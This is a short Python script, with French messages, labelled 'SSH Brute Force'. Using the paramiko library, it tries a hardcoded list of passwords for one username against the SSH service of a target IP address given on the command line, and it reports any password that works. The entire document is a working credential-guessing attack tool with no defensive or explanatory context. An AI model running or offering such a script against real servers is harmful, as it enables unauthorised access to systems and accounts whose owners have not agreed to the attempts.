import paramiko
import sys
import argparse

parser = argparse.ArgumentParser(description="SSH Brute Force")
parser.add_argument("target", help="Adresse IP du serveur distant")
args = parser.parse_args()
target = args.target

user = "utilisateur"
wordlist = ["password123", "admin", "toor", "SuperSecretPass"]

for password in wordlist:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print(f"Test avec : {password}")
        ssh.connect(target, username=user, password=password, timeout=3)
        print(f"[+] SUCCÈS ! Mot de passe trouvé : {password}")
        ssh.close()
        break
    except paramiko.AuthenticationException:
        print("[-] Échec d'authentification.")
    except Exception as e:
        print(f"[!] Erreur de connexion : {e}")
    ssh.close()